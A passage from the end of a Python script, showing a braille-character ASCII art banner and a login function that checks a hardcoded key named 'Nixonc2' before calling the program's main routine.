⣿⣿⣿⣿⣿⣿⣿⡷⠄⠀⠀⣿⣿⣿⣫⣭⣿⣿⣿⣿⣿⣿⣿⣿⣭⣿⣿⣿⣿⣟⣿⣿⣿⣋⣿⣿⣿⣷⠀⠧⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⢰⣹⡒⠒⠛⣫⣤⣿⡯⣫⡿⣿⣿⣿⢙⣿⣟⣛⣿⣟⣛⣹⣿⣏⣿⣥⣿⣣⣿⣝⠛⢒⣞⣉⠀⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣧⡘⠿⠿⠿⣿⣿⣿⣿⣷⢻⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⢠⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣷⣤⣾⣇⢻⣿⣿⣿⣿⣾⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⢻⣿⢿⣿⣿⣿⣿⣿⣿⣿⡏⢠⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠘⢿⣿⣿⣿⣿⣧⣿⡿⠟⣿⢾⡿⠻⢟⣩⣽⣿⣯⢿⣿⣿⣿⣿⣿⡟⢣⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡌⢻⣿⣿⣿⣿⣿⣿⣷⣗⢚⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠡⣄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣴⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⠙⠿⠏⣈⡙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⣡⡘⠿⠏⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣯⣍⢹⣿⣿⡿⠉⢩⣥⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣈⠛⠛⢛⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
""")))

	user = "Nixonc2"
	username = input(Colorate.Horizontal(Colors.DynamicMIX((Col.red, Col.red)),"""
𝙴𝚗𝚝𝚎𝚛𝙺𝚎𝚢 ~> """))
	if username != user:
		print("</> 𝙴𝚗𝚝𝚎𝚛 𝙴𝚛𝚛𝚘𝚛 </>")
		sys.exit(1)
	elif username == user:
		print("</> 𝙴𝚗𝚝𝚎𝚛 𝚂𝚞𝚌𝚌𝚎𝚜𝚜 </>")
		time.sleep(1)
		main(username)
if __name__ == "__main__":
    login()
